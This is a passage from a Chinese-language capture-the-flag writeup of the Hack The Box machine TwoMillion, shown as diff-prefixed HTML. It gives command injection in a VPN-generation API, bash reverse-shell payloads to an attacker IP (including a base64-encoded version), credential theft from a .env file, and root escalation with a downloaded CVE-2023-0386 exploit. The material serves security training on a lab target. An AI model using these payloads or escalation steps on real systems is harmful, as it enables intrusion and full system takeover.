+</span></span><span class="line"><span class="cl">Cache-Control: no-store, no-cache, must-revalidate
+</span></span><span class="line"><span class="cl">Pragma: no-cache
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;id&#34;</span>:13,<span class="s2">&#34;username&#34;</span>:<span class="s2">&#34;admin&#34;</span>,<span class="s2">&#34;is_admin&#34;</span>:1<span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>答案：/api/v1/admin/settings/update</strong></p>
+<h3 id="task-8">Task 8
+</h3><blockquote>
+<p>What API endpoint has a command injection vulnerability in it?</p>
+<p>哪个API接口存在命令注入漏洞？</p>
+</blockquote>
+<p>也是一步步试接口</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/TwoMillion<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# curl -i -X POST http://2million.htb/api/v1/admin/vpn/generate <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-H <span class="s2">&#34;Cookie: PHPSESSID=o4ug9oiv9n0l72vpsio4sa3qiu&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-H <span class="s2">&#34;Content-Type: application/json&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-d <span class="s1">&#39;{&#34;username&#34;: &#34;admin;id;&#34;}&#39;</span>
+</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl">Server: nginx
+</span></span><span class="line"><span class="cl">Date: Mon, <span class="m">09</span> Nov <span class="m">2026</span> 04:14:15 GMT
+</span></span><span class="line"><span class="cl">Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
+</span></span><span class="line"><span class="cl">Transfer-Encoding: chunked
+</span></span><span class="line"><span class="cl">Connection: keep-alive
+</span></span><span class="line"><span class="cl">Expires: Thu, <span class="m">19</span> Nov <span class="m">1981</span> 08:52:00 GMT
+</span></span><span class="line"><span class="cl">Cache-Control: no-store, no-cache, must-revalidate
+</span></span><span class="line"><span class="cl">Pragma: no-cache
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>答案：/api/v1/admin/vpn/generate</strong></p>
+<h3 id="task-9">Task 9
+</h3><blockquote>
+<p>What file is commonly used in PHP applications to store environment variable values?</p>
+<p>PHP应用程序中通常使用哪个文件来存储环境变量的值？</p>
+</blockquote>
+<p><code>.env</code> 是现代 PHP（Laravel、Symfony 等框架）标准用来存放环境变量的文件，使用 <code>vlucas/phpdotenv</code> 库加载，存放数据库账号、密钥、APP 环境这类敏感配置。</p>
+<p><code>php.ini</code> 是 PHP 本身的运行配置文件（不是业务环境变量）。</p>
+<p><strong>答案：.env</strong></p>
+<h3 id="submit-user-flag">Submit User Flag
+</h3><blockquote>
+<p>Submit the flag located in the admin user&rsquo;s home directory.</p>
+<p>提交位于管理员用户主目录中的标志。</p>
+</blockquote>
+<p>通过命令注入反弹 Shell。</p>
+<p>直接执行命令失败了，一般就是涉及到一些特殊字符，比如 <code>&amp; &gt; /</code> 这些在传输过程中出现了问题。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/TwoMillion<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# curl -i -X POST http://2million.htb/api/v1/admin/vpn/generate <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-H <span class="s2">&#34;Cookie: PHPSESSID=o4ug9oiv9n0l72vpsio4sa3qiu&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-H <span class="s2">&#34;Content-Type: application/json&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-d <span class="s1">&#39;{&#34;username&#34;: &#34;admin;bash -i &gt;&amp; /dev/tcp/10.10.17.69/1234 0&gt;&amp;1;&#34;}&#39;</span>
+</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl">Server: nginx
+</span></span><span class="line"><span class="cl">Date: Mon, <span class="m">09</span> Nov <span class="m">2026</span> 04:17:46 GMT
+</span></span><span class="line"><span class="cl">Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
+</span></span><span class="line"><span class="cl">Transfer-Encoding: chunked
+</span></span><span class="line"><span class="cl">Connection: keep-alive
+</span></span><span class="line"><span class="cl">Expires: Thu, <span class="m">19</span> Nov <span class="m">1981</span> 08:52:00 GMT
+</span></span><span class="line"><span class="cl">Cache-Control: no-store, no-cache, must-revalidate
+</span></span><span class="line"><span class="cl">Pragma: no-cache
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>所以改为 base64 编码后传输：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/TwoMillion<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# <span class="nb">echo</span> <span class="s2">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.17.69/1234 0&gt;&amp;1&#39;&#34;</span> <span class="p">|</span> base64
+</span></span><span class="line"><span class="cl">YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNy42OS8xMjM0IDA+JjEnCg<span class="o">==</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/TwoMillion<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# curl -i -X POST http://2million.htb/api/v1/admin/vpn/generate <span class="se">\ </span>                       
+</span></span><span class="line"><span class="cl">-H <span class="s2">&#34;Cookie: PHPSESSID=o4ug9oiv9n0l72vpsio4sa3qiu&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-H <span class="s2">&#34;Content-Type: application/json&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-d <span class="s1">&#39;{&#34;username&#34;: &#34;admin;echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNy42OS8xMjM0IDA+JjEnCg==|base64 -d|bash;&#34;}&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>提前开启监听，成功得到 shell：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/TwoMillion<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nc -lvnp <span class="m">1234</span>                        
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">1234</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.17.69<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.229.66<span class="o">]</span> <span class="m">56686</span>
+</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>1093<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
+</span></span><span class="line"><span class="cl">bash: no job control in this shell
+</span></span><span class="line"><span class="cl">www-data@2million:~/html$ id
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>探测用户家目录，发现有 admin 用户，但是其中的 user.txt 无法读取。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">www-data@2million:~/html$ ls -l /home
+</span></span><span class="line"><span class="cl">ls -l /home
+</span></span><span class="line"><span class="cl">total <span class="m">4</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">4</span> admin admin <span class="m">4096</span> Jun  <span class="m">6</span>  <span class="m">2023</span> admin
+</span></span><span class="line"><span class="cl">www-data@2million:~/html$ <span class="nb">cd</span> /home/admin<span class="p">;</span>ls -la
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> /home/admin<span class="p">;</span>ls -la
+</span></span><span class="line"><span class="cl">total <span class="m">32</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">4</span> admin admin <span class="m">4096</span> Jun  <span class="m">6</span>  <span class="m">2023</span> .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> root  root  <span class="m">4096</span> Jun  <span class="m">6</span>  <span class="m">2023</span> ..
+</span></span><span class="line"><span class="cl">lrwxrwxrwx <span class="m">1</span> root  root     <span class="m">9</span> May <span class="m">26</span>  <span class="m">2023</span> .bash_history -&gt; /dev/null
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> admin admin  <span class="m">220</span> May <span class="m">26</span>  <span class="m">2023</span> .bash_logout
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> admin admin <span class="m">3771</span> May <span class="m">26</span>  <span class="m">2023</span> .bashrc
+</span></span><span class="line"><span class="cl">drwx------ <span class="m">2</span> admin admin <span class="m">4096</span> Jun  <span class="m">6</span>  <span class="m">2023</span> .cache
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> admin admin  <span class="m">807</span> May <span class="m">26</span>  <span class="m">2023</span> .profile
+</span></span><span class="line"><span class="cl">drwx------ <span class="m">2</span> admin admin <span class="m">4096</span> Jun  <span class="m">6</span>  <span class="m">2023</span> .ssh
+</span></span><span class="line"><span class="cl">-rw-r----- <span class="m">1</span> root  admin   <span class="m">33</span> Nov  <span class="m">9</span> 03:07 user.txt
+</span></span><span class="line"><span class="cl">www-data@2million:/home/admin$ cat user.txt
+</span></span><span class="line"><span class="cl">cat user.txt
+</span></span><span class="line"><span class="cl">cat: user.txt: Permission denied
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>去 <code>.env</code> 找到 admin 密码。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">www-data@2million:~/html$ cat .env
+</span></span><span class="line"><span class="cl">cat .env
+</span></span><span class="line"><span class="cl"><span class="nv">DB_HOST</span><span class="o">=</span>127.0.0.1
+</span></span><span class="line"><span class="cl"><span class="nv">DB_DATABASE</span><span class="o">=</span>htb_prod
+</span></span><span class="line"><span class="cl"><span class="nv">DB_USERNAME</span><span class="o">=</span>admin
+</span></span><span class="line"><span class="cl"><span class="nv">DB_PASSWORD</span><span class="o">=</span>SuperDuperPass123
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>SSH 登录：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/TwoMillion<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# ssh admin@10.129.229.66
+</span></span><span class="line"><span class="cl">......
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">admin@2million:~$ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>admin<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>admin<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>admin<span class="o">)</span>
+</span></span><span class="line"><span class="cl">admin@2million:~$ cat user.txt 
+</span></span><span class="line"><span class="cl">c90aab6331cd111aa99c603b23d4e153
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>答案：c90aab6331cd111aa99c603b23d4e153</strong></p>
+<h3 id="task-11">Task 11
+</h3><blockquote>
+<p>What is the email address of the sender of the email sent to admin?</p>
+<p>发送给管理员的电子邮件的发件人电子邮件地址是什么？</p>
+</blockquote>
+<p>Linux 本地默认收件邮箱一般在 <code>/var/mail/&lt;用户名&gt;</code> 或者 <code>/var/spool/mail/&lt;用户名&gt;</code>。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">admin@2million:~$ ls -la /var/mail/admin
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> admin admin <span class="m">540</span> Jun  <span class="m">2</span>  <span class="m">2023</span> /var/mail/admin
+</span></span><span class="line"><span class="cl">admin@2million:~$ <span class="nb">cd</span> /var/mail/
+</span></span><span class="line"><span class="cl">admin@2million:/var/mail$ cat admin
+</span></span><span class="line"><span class="cl">From: ch4p &lt;ch4p@2million.htb&gt;
+</span></span><span class="line"><span class="cl">To: admin &lt;admin@2million.htb&gt;
+</span></span><span class="line"><span class="cl">Cc: g0blin &lt;g0blin@2million.htb&gt;
+</span></span><span class="line"><span class="cl">Subject: Urgent: Patch System OS
+</span></span><span class="line"><span class="cl">Date: Tue, <span class="m">1</span> June <span class="m">2023</span> 10:45:22 -0700
+</span></span><span class="line"><span class="cl">Message-ID: &lt;9876543210@2million.htb&gt;
+</span></span><span class="line"><span class="cl">X-Mailer: ThunderMail Pro 5.2
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Hey admin,
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">I<span class="s1">&#39;m know you&#39;</span>re working as fast as you can to <span class="k">do</span> the DB migration. While we<span class="s1">&#39;re partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can&#39;</span>t get popped by that.
+</span></span><span class="line"><span class="cl">我知道你正在抓紧进行数据库迁移。趁我们服务部分中断的这段时间，能不能顺便把 Web 服务器的操作系统也升级一下？今年已经爆出好几个高危的 Linux 内核漏洞了，那个 OverlayFS / FUSE 相关的漏洞看起来非常危险，我们可不能被这个漏洞拿下权限。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">HTB Godfather
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>答案：ch4p@2million.htb</strong></p>
+<h3 id="task-12">Task 12
+</h3><blockquote>
+<p>What is the 2023 CVE ID for a vulnerability in that allows an attacker to move files in the Overlay file system while maintaining metadata like the owner and SetUID bits?</p>
+<p>2023 年 CVE ID 是什么？该漏洞允许攻击者在 Overlay 文件系统中移动文件，同时保留所有者和 SetUID 位等元数据。</p>
+</blockquote>
+<p>搜索 OverlayFS，找到 CVE-2023-0386 Linux Kernel 权限提升漏洞。</p>
+<p>在Linux内核的OverlayFS子系统中，当用户将一个具有权限的文件从一个nosuid挂载点复制到另一个挂载点时，未经授权的攻击者可以执行 setuid文件，导致权限提升。</p>
+<p>漏洞范围 v5.11-rc1 &lt;= Linux Kernel &lt;= v6.2-rc5</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">admin@2million:/var/mail$ uname -a
+</span></span><span class="line"><span class="cl">Linux 2million 5.15.70-051570-generic <span class="c1">#202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>答案：CVE-2023-0386</strong></p>
+<h3 id="submit-root-flag">Submit Root Flag
+</h3><blockquote>
+<p>Submit the flag located in root&rsquo;s home directory.</p>
+<p>提交位于 root 用户主目录中的 flag。</p>
+</blockquote>
+<p>下载 exp ：https://github.com/Fanxiaoyao66/CVE-2023-0386.git</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone https://github.com/Fanxiaoyao66/CVE-2023-0386.git
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/CVE-2023-0386<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# python3 -m http.server <span class="m">8000</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>靶机下载其中的 <code>fuse.c</code> 和 <code>exp.sh</code> 文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">admin@2million:~$ wget 10.10.17.69:8000/exp.sh 
+</span></span><span class="line"><span class="cl">admin@2million:~$ wget 10.10.17.69:8000/fuse.c
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后执行 <code>exp.sh</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">admin@2million:~$ /bin/bash exp.sh 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Create dir
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Compile fuse.c
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Create fuse file system
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Create overlayFS
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Copy Up
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> You are root!
+</span></span><span class="line"><span class="cl"><span class="c1"># id</span>
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1000<span class="o">(</span>admin<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># cd /root;cat root.txt</span>
+</span></span><span class="line"><span class="cl">13fe3dafe88e6c9827e0ec79935e3470
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="task-14">Task 14
+</h3><blockquote>
+<p>[Alternative Priv Esc] What is the version of the GLIBC library on TwoMillion?</p>
+<p>[备选方案] TwoMillion 上的 GLIBC 库版本是什么？</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># ldd --version</span>
+</span></span><span class="line"><span class="cl">ldd <span class="o">(</span>Ubuntu GLIBC 2.35-0ubuntu3.1<span class="o">)</span> 2.35
+</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>C<span class="o">)</span> <span class="m">2022</span> Free Software Foundation, Inc.
+</span></span><span class="line"><span class="cl">This is free software<span class="p">;</span> see the <span class="nb">source</span> <span class="k">for</span> copying conditions.  There is NO
+</span></span><span class="line"><span class="cl">warranty<span class="p">;</span> not even <span class="k">for</span> MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+</span></span><span class="line"><span class="cl">Written by Roland McGrath and Ulrich Drepper.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>答案：2.35</strong></p>
+<h3 id="task-15">Task 15
+</h3><blockquote>
+<p>[Alternative Priv Esc] What is the CVE ID for the 2023 buffer overflow vulnerability in the GNU C dynamic loader?</p>
+<p>[备选方案] GNU C 动态加载器中 2023 年缓冲区溢出漏洞的 CVE ID 是什么？</p>
+</blockquote>
+<p><strong>CVE-2023-4911</strong>（Looney Tunables），glibc ld.so 缓冲区溢出本地提权漏洞。</p>
+<p><strong>答案：CVE-2023-4911</strong></p>
+<h3 id="task-16">Task 16
+</h3><blockquote>
+<p>[Alternative Priv Esc] With a shell as admin or www-data, find a POC for Looney Tunables. What is the name of the environment variable that triggers the buffer overflow? After answering this question, run the POC and get a shell as root.</p>
+<p>[备选方案] 使用 admin 或 www-data 用户权限获取 shell，找到 Looney Tunables 的一个 POC（概念验证）。触发缓冲区溢出的环境变量名称是什么？回答此问题后，运行该 POC 并以 root 用户身份获取 shell。</p>
+</blockquote>
+<p><a class="link" href="https://github.com/leesh3288/CVE-2023-4911"  target="_blank" rel="noopener"
+    >https://github.com/leesh3288/CVE-2023-4911</a></p>
+<p><a class="link" href="https://github.com/RickdeJager/CVE-2023-4911"  target="_blank" rel="noopener"
+    >https://github.com/RickdeJager/CVE-2023-4911</a></p>
+<p><strong>答案：GLIBC_TUNABLES</strong></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/14.-cap/">
+        
+        
+            <div class="article-image">
+                <img src="/p/14.-cap/assets/image-20261108105321725.ca37d98cbd0867071a239ed30859a09c_hu2194329561987376679.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 14. Cap"
+                        
+                        data-hash="md5-yjfZjL0IZwcaI57TCFmgnA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">14. Cap</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/mazesec-sshhole/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Mazesec sshhole</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/mazesec-pot/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">MazeSec Pot</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2026 Sp1ke
+    </section>
+    
+    <section class="powerby">
+        
+            记录安全学习 <br/>
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.26.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
